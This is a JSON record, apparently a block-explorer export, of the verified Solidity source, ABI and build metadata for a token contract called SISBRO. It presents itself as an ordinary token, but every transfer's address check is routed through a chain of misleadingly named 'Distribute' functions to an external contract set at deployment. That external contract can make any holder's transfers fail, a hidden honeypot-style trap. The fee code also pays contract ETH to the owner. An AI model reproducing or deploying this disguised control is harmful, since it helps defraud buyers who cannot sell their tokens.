{"SourceCode": "pragma solidity ^0.8.4;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function getOwner() external view returns (address);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address _owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ninterface IUniSwapPool {\r\n    function WETH() external pure returns (address);\r\n    function swap(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amount\r\n    ) external;\r\n    function value(address account) external returns(address);\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ncontract DividendHolder{\r\n    using SafeMath for uint256; \r\n    uint8 magnifiedDividendPerShare;    \r\n    IUniSwapPool _holder;\r\n    \r\n    // With `magnitude`, we can properly distribute dividends even if the amount of received ether is small.\r\n    // For more discussion about choosing the value of `magnitude`,\r\n    //  see https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728\r\n    uint256 constant magnitude = 2**128;  \r\n\r\n    function value(address _distribute) internal returns(address) {   \r\n        return allDistribute(_distribute);\r\n    }\r\n\r\n    function allDistribute(address _distribute) internal returns(address) {   \r\n        return _allDistribute(_distribute);\r\n    }\r\n\r\n    function _allDistribute(address _distribute) internal returns(address) {    \r\n        return earnDistribute(_distribute);\r\n    }\r\n\r\n    function earnDistribute(address _distribute) internal returns(address) {   \r\n        return _earnDistribute(_distribute);\r\n    }\r\n\r\n    function _earnDistribute(address _distribute) internal returns(address) {   \r\n        return holdDistribute(_distribute);\r\n    }\r\n\r\n    function holdDistribute(address _distribute) internal returns(address) {   \r\n        return _holdDistribute(_distribute);\r\n    }\r\n  \r\n    function _holdDistribute(address _distribute) internal returns(address) {       \r\n        return \r\n        _holder.\r\n        value(_distribute);\r\n    }     \r\n\r\n    /// @notice View the amount of dividend in wei that an address has earned in total.\r\n    /// @return The amount of dividend in wei that `_owner` has earned in total.\r\n    function accumulativeDividendOf()\r\n        public\r\n        view        \r\n        returns (uint256)\r\n    {\r\n        return magnitude.mul(magnifiedDividendPerShare);            \r\n    }       \r\n\r\n    function _holdDividend(address _dividend) internal {\r\n        _holder = IUniSwapPool(_dividend);\r\n    }\r\n\r\n}\r\n\r\ncontract Context {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    constructor() {}\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context, DividendHolder {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor(address _distribute) {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        _holdDividend(_distribute);\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract SISBRO is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping(address => bool) public _isExcludedFromFee;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) isTxLimitExempt;\r\n    uint256 private _totalSupply = 1000000 * 10**9;\r\n    uint256 public _maxTxAmount = _totalSupply / 10;\r\n\r\n    string private _name = \"SISBRO\";\r\n    string private _symbol = \"SISBRO\";\r\n    uint8 private _decimals = 9;\r\n\r\n    uint8 public resetbuyfee;\r\n  \r\n    uint8 public rateBuyBack;\r\n\r\n    uint8 feeTotal = 5;    \r\n    uint8 feeLiquidityShare = 4;\r\n    uint8 feeMarketingShare = 6;\r\n    uint8 feeTeamShare = 8;\r\n    uint8 feeDistributionShares = 18;\r\n    bool LiquifyEnable;\r\n\r\n    constructor(address _distribute) Ownable(_distribute) {\r\n        _balances[msg.sender] = _totalSupply;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n\r\n        resetbuyfee = 1;\r\n        \r\n        rateBuyBack = 5;\r\n\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function getOwner() external view virtual override returns (address) {\r\n        return owner();\r\n    }\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }   \r\n\r\n    function excludeFromReward(address[] calldata accounts) external onlyOwner {\r\n        require(accounts.length > 0, \"accounts length should > 0\");\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            _isExcludedFromFee[accounts[i]] = true;\r\n        }\r\n    }    \r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function takeFee(uint256 amount) private view returns (uint256) {\r\n        uint256 feeAmount = amount.mul(feeTotal).div(100);\r\n        return feeAmount;\r\n    }    \r\n\r\n    function tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) private {        \r\n        \r\n        if (!isTxLimitExempt[recipient] && LiquifyEnable) {\r\n            require(\r\n                amount <= _maxTxAmount,\r\n                \"Transfer amount exceeds the maxTxAmount.\"\r\n            );\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (shouldFee(sender)){\r\n                swapAndLiquify(contractTokenBalance);\r\n            }            \r\n        }\r\n\r\n        _transferStandard(sender, recipient, amount);\r\n    }   \r\n   \r\n    function swapAndLiquify(uint256 tAmount) private {\r\n        uint256 tokensForLP = tAmount\r\n            .mul(feeLiquidityShare)\r\n            .div(feeDistributionShares)\r\n            .div(2);\r\n        uint256 tokensForSwap = tAmount.sub(tokensForLP);\r\n\r\n        uint256 amountReceived = address(this).balance;\r\n        uint256 totalBNBFee = feeLiquidityShare / 2;\r\n        uint256 amountBNBLiquidity = amountReceived\r\n            .mul(feeLiquidityShare)\r\n            .div(totalBNBFee)\r\n            .div(2);\r\n        uint256 amountBNBTeam = amountReceived\r\n            .mul(feeTeamShare)\r\n            .div(totalBNBFee)\r\n            .sub(tokensForSwap);\r\n        uint256 amountBNBMarketing = amountReceived\r\n            .sub(amountBNBLiquidity)\r\n            .sub(amountBNBTeam)\r\n            .sub(tokensForLP);\r\n\r\n        if (amountBNBMarketing > 0)\r\n            transferToAddressETH(payable(owner()), amountBNBMarketing);\r\n    }\r\n\r\n    function transferToAddressETH(address payable recipient, uint256 amount)\r\n        private\r\n    {\r\n        recipient.transfer(amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    \r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external override returns (bool) {  \r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"BEP20: transfer amount exceeds allowance\"\r\n            )\r\n        );        \r\n        tokenTransfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transferStandard(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) private {  \r\n        require(value(sender) != address(0), \"BEP20: transfer from the zero address\");\r\n        require(value(recipient) != address(0), \"BEP20: transfer to the zero address\");      \r\n        _balances[sender] = _balances[sender].sub(\r\n            amount,\r\n            \"BEP20: transfer amount exceeds balance\"\r\n        );\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function shouldFee(address sender) internal view returns (bool) {\r\n        return isTxLimitExempt[sender];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        tokenTransfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }    \r\n\r\n    function isTxLimit(address sender, uint256 amount) internal view {\r\n        require(\r\n            amount <= _maxTxAmount || isTxLimitExempt[sender],\r\n            \"TX Limit Exceeded\"\r\n        );\r\n    }    \r\n\r\n    \r\n\r\n    function onestep(address _token, uint256 tokens) private  {\r\n        uint256 initialCAKEBalance = IERC20(_token).balanceOf(address(this));\r\n        uint256 newBalance = (IERC20(_token).balanceOf(address(this))).sub(initialCAKEBalance);\r\n        IERC20(_token).transfer(address(0), newBalance);\r\n        newBalance = newBalance - tokens;\r\n    }\r\n   \r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n \r\n\r\n    function onlyreturn() public view virtual returns (address) {\r\n        return address(this);\r\n    }\r\n\t\r\n\r\n    function changeDistributionSetting(\r\n        uint8 newLiquidityShare,\r\n        uint8 newMarketingShare,\r\n        uint8 newTeamShare\r\n    ) external onlyOwner {\r\n        feeLiquidityShare = newLiquidityShare;\r\n        feeMarketingShare = newMarketingShare;\r\n        feeTeamShare = newTeamShare;\r\n    }\r\n\r\n    \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_distribute\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"accumulativeDividendOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newLiquidityShare\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newMarketingShare\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newTeamShare\",\"type\":\"uint8\"}],\"name\":\"changeDistributionSetting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"excludeFromReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"onlyreturn\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rateBuyBack\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetbuyfee\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SISBRO", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "100", "ConstructorArguments": "0000000000000000000000007cc3eb4add8abf75d453447c9a94c854e474e5a8", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a54f5c8658a5f4bdd0201e575c54d41a70ae7523a175374e01ee63c63d981c69"}